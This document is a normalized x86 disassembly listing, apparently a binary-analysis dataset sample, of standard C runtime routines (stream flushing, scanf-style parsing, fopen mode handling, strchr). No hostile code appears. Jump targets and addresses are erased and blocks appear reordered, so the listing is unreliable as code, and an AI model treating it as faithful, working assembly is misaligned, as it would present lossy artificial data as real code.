jmp r-xdata
sub_410a01
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_40e83e
xor esi esi
pop ecx
cmp [ rw-data ] esi
jle r-xdata
push 0x2
call sub_40e89f
cmp [ esp + 0x14 ] 0x1
pop ecx
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
push eax
push esi
call sub_4107ee
mov eax [ rw-data ]
pop ecx
pop ecx
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_410840
pop ecx
pop ecx
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_41096e
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_41096e
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_410aa5
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_412d7e
add esp 0x1c
test eax eax
jne r-xdata
sub_410b20
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_410b54
push ebp
mov ebp esp
sub esp 0x1c4
and [ ebp - 0x15 ] 0x0
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov al [ esi ]
mov [ ebp - 0x4 ] ebx
test al al
mov [ ebp - 0x34 ] ebx
je r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x15 ] al
jne r-xdata
mov ecx [ rw-data ]
movzx eax al
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax al
push 0x8
push eax
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ esi ] 0x25
jne r-xdata
dec [ ebp - 0x4 ]
push edi
lea eax [ ebp - 0x4 ]
push edi
push eax
call sub_4115e1
pop ecx
pop ecx
push eax
call sub_4115ca
movzx eax [ esi + 0x1 ]
inc esi
push eax
call sub_414419
add esp 0xc
cmp eax ebx
je r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_4115b0
mov ebx eax
pop ecx
movzx eax [ esi ]
inc esi
cmp eax ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp + 0xc ] esi
jne r-xdata
and [ ebp - 0x35 ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x17 ] 0x0
and [ ebp - 0xe ] 0x0
and [ ebp - 0xf ] 0x0
and [ ebp - 0x16 ] 0x0
xor edi edi
and [ ebp - 0x5 ] 0x0
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0xd ] 0x1
mov [ ebp - 0x30 ] ebx
movzx eax [ esi + 0x1 ]
inc esi
push eax
call sub_414419
pop ecx
jmp r-xdata
dec [ ebp - 0x4 ]
push edi
push ebx
mov ecx [ rw-data ]
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_4115b0
pop ecx
movzx ecx [ esi ]
inc esi
cmp ecx eax
mov [ ebp + 0xc ] esi
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0xc ]
inc [ ebp - 0x20 ]
lea eax [ eax + eax * 4 ]
lea eax [ ebx + eax * 2 - 0x30 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
test eax eax
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp [ esi ] 0x25
jne r-xdata
dec [ ebp - 0x4 ]
push edi
push eax
call sub_4115ca
dec [ ebp - 0x4 ]
push edi
push ebx
call sub_4115ca
add esp 0x10
dec [ ebp - 0x4 ]
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0xf ] 0x0
je r-xdata
mov edi [ ebp + 0x8 ]
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
dec [ ebp - 0xd ]
dec [ ebp - 0x5 ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
movzx ebx [ esi + 0x1 ]
inc esi
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0xe ] 0x0
mov [ ebp + 0xc ] esi
jne r-xdata
mov esi eax
inc [ ebp - 0xd ]
cmp ebx 0x77
je r-xdata
inc [ ebp - 0xe ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
and [ ebp - 0xf ] 0x0
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
add eax 0x4
mov [ ebp + 0x10 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x2c ] eax
inc [ ebp - 0x5 ]
jmp r-xdata
inc [ ebp - 0xf ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
mov ebx [ ebp + 0xc ]
movzx esi [ ebx ]
or esi 0x20
cmp esi 0x6e
mov [ ebp - 0x3c ] esi
je r-xdata
mov al [ esi ]
cmp al 0x53
je r-xdata
cmp [ esi + 0x1 ] 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
xor eax eax
cmp [ ebp - 0x20 ] eax
je r-xdata
cmp esi 0x63
je r-xdata
mov [ ebp - 0x5 ] 0x1
cmp al 0x43
je r-xdata
cmp [ esi + 0x2 ] 0x34
lea eax [ esi + 0x2 ]
jne r-xdata
inc [ ebp - 0xd ]
jmp r-xdata
cmp esi 0x6f
jg r-xdata
cmp [ ebp - 0xc ] eax
je r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_4115b0
cmp esi 0x7b
je r-xdata
or [ ebp - 0x5 ] 0xff
jmp r-xdata
inc [ ebp - 0x30 ]
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x24 ] 0x0
mov esi eax
jmp r-xdata
mov eax esi
sub eax 0x70
je r-xdata
je r-xdata
push [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
push [ ebp - 0x14 ]
jmp r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_4115e1
pop ecx
jmp r-xdata
mov [ ebp - 0xd ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x14 ]
cmp ebx 0x2d
jne r-xdata
cmp esi 0x63
je r-xdata
call sub_4115ca
pop ecx
pop ecx
jmp r-xdata
pop ecx
mov [ ebp - 0x14 ] eax
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x17 ] 0x1
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
cmp esi 0x64
je r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
dec [ ebp - 0xc ]
jne r-xdata
mov edi rw-data
mov [ ebp - 0x16 ] 0x1
sub eax 0x3
je r-xdata
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
inc [ ebp - 0xc ]
mov [ ebp - 0x20 ] 0x1
jle r-xdata
cmp [ ebp - 0xf ] 0x0
jne r-xdata
cmp [ ebp - 0xf ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_4115b0
pop ecx
mov ebx eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov dl [ ebp - 0x35 ]
cmp [ edi ] 0x5d
jne r-xdata
mov ebx [ ebp - 0x14 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
mov edi rw-data
jmp r-xdata
mov [ ebp - 0x16 ] 0x1
movzx eax [ ebx ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
cmp esi 0x67
jle r-xdata
cmp [ ebp - 0x17 ] 0x0
je r-xdata
cmp esi 0x78
je r-xdata
cmp [ ebp - 0x17 ] 0x0
je r-xdata
cmp esi 0x78
jne r-xdata
mov [ ebp - 0xf ] 0x1
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
inc edi
cmp al 0x2d
jne r-xdata
mov dl 0x5d
inc edi
mov [ ebp - 0x59 ] 0x20
jmp r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x17 ] 0x1
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
or [ ebp - 0x18 ] 0xff
dec [ ebp - 0x15 ]
cmp [ ebp - 0xe ] 0x0
jne r-xdata
mov ebx [ ebp - 0x14 ]
lea esi [ ebp - 0x1c4 ]
cmp ebx 0x2d
jne r-xdata
cmp esi 0x69
je r-xdata
cmp esi 0x46
jne r-xdata
neg edi
cmp [ rw-data ] 0x1
jle r-xdata
cmp esi 0x70
je r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
neg eax
adc ecx 0x0
mov [ ebp - 0x28 ] eax
neg ecx
mov [ ebp - 0x24 ] ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0x3c ] 0x7b
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x64 ]
or [ eax ] bl
jmp r-xdata
test dl dl
je r-xdata
mov al [ edi ]
cmp al 0x5d
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0xc ]
jne r-xdata
mov edi [ ebp + 0xc ]
inc edi
mov [ ebp + 0xc ] edi
cmp [ edi ] 0x5e
jne r-xdata
mov [ ebp - 0x16 ] 0x1
inc [ ebp - 0x15 ]
inc [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x44 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1c4 ] bl
lea esi [ ebp - 0x1c3 ]
jmp r-xdata
push 0x64
pop esi
cmp esi 0x6e
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] 0x0
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x80
push 0x80
push ebx
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x80
push 0x80
push ebx
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ ebp - 0x2c ]
dec [ ebp - 0x4 ]
push edi
push [ ebp - 0x14 ]
mov [ ebp - 0x30 ] esi
call sub_4115ca
pop ecx
pop ecx
mov [ ebp + 0xc ] edi
mov cl [ edi ]
cmp cl 0x5d
je r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_4115b0
mov ebx eax
pop ecx
cmp bl 0x78
mov [ ebp - 0x14 ] ebx
je r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_4115b0
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
push 0x20
lea eax [ ebp - 0x64 ]
push 0x0
push eax
call sub_40cc70
add esp 0xc
cmp [ ebp - 0x3c ] 0x7b
jne r-xdata
mov eax edi
lea edi [ eax + 0x1 ]
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov edi [ ebp + 0x8 ]
dec [ ebp - 0xc ]
inc [ ebp - 0x4 ]
push edi
call sub_4115b0
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
cmp [ ebp - 0xe ] 0x0
mov edi [ ebp - 0x4 ]
je r-xdata
cmp [ ebp - 0xe ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
push ebx
call sub_4115ca
pop ecx
pop ecx
push ebx
shl edi 0x4
call sub_411579
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
test eax eax
je r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
push ebx
call sub_4115ca
pop ecx
pop ecx
cmp esi 0x6f
jne r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
push 0x4
pop ecx
call sub_414450
push ebx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
call sub_411579
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
test eax eax
je r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_4115b0
cmp eax 0xffffffff
pop ecx
mov [ ebp - 0x14 ] eax
je r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
inc edi
cmp dl cl
jae r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_4115b0
pop ecx
mov ebx eax
mov [ ebp - 0x14 ] ebx
push 0x78
jmp r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0xf ] 0x1
jmp r-xdata
mov [ ebp - 0xc ] 0x15d
cmp [ ebp - 0xc ] 0x15d
jle r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x34 ]
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_4115b0
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
dec [ ebp - 0xc ]
je r-xdata
cmp esi 0x6f
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0xa
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
call sub_410b20
cmp ebx 0x38
jge r-xdata
inc [ ebp - 0x1c ]
lea eax [ ebx - 0x30 ]
cdq
add [ ebp - 0x28 ] eax
adc [ ebp - 0x24 ] edx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
dec [ ebp - 0x4 ]
push edi
push eax
call sub_4115ca
pop ecx
pop ecx
mov ecx eax
push 0x1
and ecx 0x7
pop edx
movsx ebx [ ebp - 0x18 ]
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x64 ]
xor ecx ebx
test ecx edx
je r-xdata
cmp [ ebp - 0x30 ] esi
je r-xdata
mov al dl
mov dl cl
mov al cl
jmp r-xdata
pop esi
jmp r-xdata
cmp esi 0x78
mov [ ebp - 0x1c ] 0x1
je r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x2c ]
je r-xdata
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
lea edi [ edi + edi * 4 ]
shl edi 0x1
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_4115b0
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
dec [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
push 0x3
pop ecx
call sub_414450
jmp r-xdata
cmp [ ebp - 0xe ] 0x0
jne r-xdata
cmp [ ebp - 0xe ] 0x0
jne r-xdata
xor dl dl
jmp r-xdata
movzx edx dl
movzx esi al
sub esi edx
inc esi
cmp dl al
ja r-xdata
push [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
push ebx
call sub_4115ca
pop ecx
pop ecx
push 0x30
pop ebx
jmp r-xdata
push 0x6f
cmp [ rw-data ] bl
jne r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov [ eax ] di
mov [ eax ] edi
jmp r-xdata
inc [ ebp - 0x1c ]
cmp [ ebp - 0x20 ] 0x0
lea edi [ edi + ebx - 0x30 ]
je r-xdata
shl edi 0x3
jmp r-xdata
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
inc [ ebp - 0x34 ]
cmp [ ebp - 0x3c ] 0x63
je r-xdata
inc [ ebp - 0x30 ]
jmp r-xdata
cmp [ ebp - 0x16 ] 0x0
je r-xdata
mov ecx edx
mov eax edx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x64 ]
or [ eax ] bl
inc edx
dec esi
jne r-xdata
mov [ ebp - 0x14 ] ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
inc [ ebp - 0x1c ]
mov [ esi ] bl
inc esi
inc [ ebp - 0x4 ]
push edi
call sub_4115b0
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
cmp [ ebp - 0x16 ] 0x0
mov eax [ ebp - 0x2c ]
je r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov [ esi ] al
inc esi
mov ecx [ rw-data ]
mov [ ebp - 0x38 ] al
movzx eax al
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
dec [ ebp - 0x4 ]
push edi
push ebx
call sub_4115ca
cmp [ ebp - 0x1c ] 0x0
pop ecx
pop ecx
je r-xdata
cmp ebx 0x65
je r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_4115b0
mov ebx eax
mov al [ rw-data ]
mov [ esi ] al
pop ecx
mov [ ebp - 0x14 ] ebx
inc esi
and [ eax ] 0x0
jmp r-xdata
and [ eax ] 0x0
jmp r-xdata
push [ rw-data ]
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x3e ]
push eax
call sub_4142f3
mov ax [ ebp - 0x3e ]
add esp 0xc
mov [ esi ] ax
inc esi
inc esi
jmp r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_4115b0
pop ecx
mov [ ebp - 0x37 ] al
cmp [ ebp - 0xe ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
cmp ebx 0x45
jne r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
mov [ ebp - 0x2c ] esi
jmp r-xdata
inc [ ebp - 0x34 ]
and [ esi ] 0x0
lea eax [ ebp - 0x1c4 ]
push eax
movsx eax [ ebp - 0xd ]
push [ ebp - 0x2c ]
dec eax
push eax
call [ rw-data ]
add esp 0xc
jmp r-xdata
mov [ esi ] 0x65
inc esi
inc [ ebp - 0x4 ]
push edi
call sub_4115b0
mov ebx eax
pop ecx
cmp ebx 0x2d
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ esi ] al
inc esi
jmp r-xdata
inc [ ebp - 0x1c ]
mov [ esi ] bl
inc esi
inc [ ebp - 0x4 ]
push edi
call sub_4115b0
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_4115b0
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
and [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ ebp - 0x1c ]
mov [ esi ] bl
inc esi
jmp r-xdata
sub_411579
cmp [ rw-data ] 0x1
push esi
jle r-xdata
mov esi [ esp + 0x8 ]
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
mov esi [ esp + 0x8 ]
push 0x4
push esi
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
mov eax esi
pop esi
retn
and esi 0xffffffdf
sub esi 0x7
test eax eax
jne r-xdata
sub_4115e1
push esi
mov esi [ esp + 0x8 ]
push edi
push [ esp + 0x10 ]
inc [ esi ]
call sub_4115b0
mov edi eax
push edi
call sub_414419
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax edi
pop edi
pop esi
retn
sub_411605
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov al [ edi ]
cmp al 0x61
je r-xdata
mov ecx 0x109
cmp al 0x72
je r-xdata
push 0x1a4
push [ ebp + 0x10 ]
push ecx
push [ ebp + 0x8 ]
call sub_4144dd
mov ecx eax
add esp 0x10
cmp ecx ebx
jge r-xdata
cmp edx ebx
je r-xdata
xor ecx ecx
or esi 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
movsx eax al
cmp eax 0x54
jg r-xdata
push 0x1
pop edx
mov ecx 0x301
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax 0x62
je r-xdata
je r-xdata
or esi 0x2
test ch 0xc0
je r-xdata
dec eax
je r-xdata
mov eax 0x1000
test eax ecx
jne r-xdata
sub eax 0x2b
je r-xdata
or ch 0x80
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
or ecx eax
jmp r-xdata
test cl 0x2
jne r-xdata
sub eax 0x19
je r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
je r-xdata
mov [ ebp - 0x8 ] 0x1
or esi 0x4000
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
and ecx 0xfffffffe
and esi 0xfffffffc
or ecx 0x2
or esi 0x80
jmp r-xdata
test cl 0x40
jne r-xdata
sub eax 0xe
je r-xdata
mov [ ebp - 0x8 ] 0x1
and esi 0xffffbfff
jmp r-xdata
test ch 0xc0
jne r-xdata
or ecx 0x40
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
dec eax
jne r-xdata
or ch 0x40
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x20
jmp r-xdata
sub_411775
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_40e83e
xor esi esi
cmp [ rw-data ] ebx
pop ecx
jle r-xdata
push 0x2
call sub_40e89f
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
cmp eax ebx
je r-xdata
push 0x38
shl esi 0x2
call sub_40bb22
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
mov eax [ esi + eax ]
cmp eax ebx
je r-xdata
test [ eax + 0xc ] 0x83
jne r-xdata
add eax 0x20
push eax
call [ InitializeCriticalSection@IAT ]
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
inc esi
cmp esi [ rw-data ]
jl r-xdata
push eax
push esi
call sub_4107ee
pop ecx
pop ecx
mov ecx [ rw-data ]
mov eax [ ecx + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
or [ edi + 0x10 ] 0xffffffff
mov [ edi + 0x4 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
jmp r-xdata
mov edi [ ecx + esi * 4 ]
jmp r-xdata
push eax
push esi
call sub_410840
pop ecx
pop ecx
cmp edi ebx
je r-xdata
sub_411850
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_41190c
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_413dcf
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_4147ac
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
lea edi [ edi + ecx * 4 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_4119e8
push esi
